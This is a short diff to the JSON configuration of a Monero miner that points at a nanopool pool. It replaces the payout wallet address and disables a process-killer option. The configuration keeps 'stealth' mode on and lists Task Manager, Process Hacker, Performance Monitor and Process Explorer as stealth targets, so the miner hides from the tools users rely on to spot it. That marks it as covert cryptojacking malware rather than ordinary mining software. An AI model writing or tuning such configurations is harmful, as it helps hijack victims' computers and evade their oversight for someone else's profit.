@@ -2,7 +2,7 @@
 	"algo": "rx/0",
 	"pool": "xmr-eu2.nanopool.org",
 	"port": 14433,
-	"wallet": "8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N",
+	"wallet": "846ngQghDrKSTF6ATa4fna1Go9zKYKTXyGcTNuD16E3bYMSFowkpoeghRKTGqX1zJ7317xWEiz4KuYg4LB2VHNNy2WifoGv",
 	"password": "",
 	"rig-id": "",
 	"keepalive": false,
@@ -13,6 +13,6 @@
 	"idle-cpu": 50,
 	"stealth": true,
 	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
-	"process-killer": true,
+	"process-killer": false,
 	"kill-targets": "program1.exe,program2.exe,program3.exe"
 }
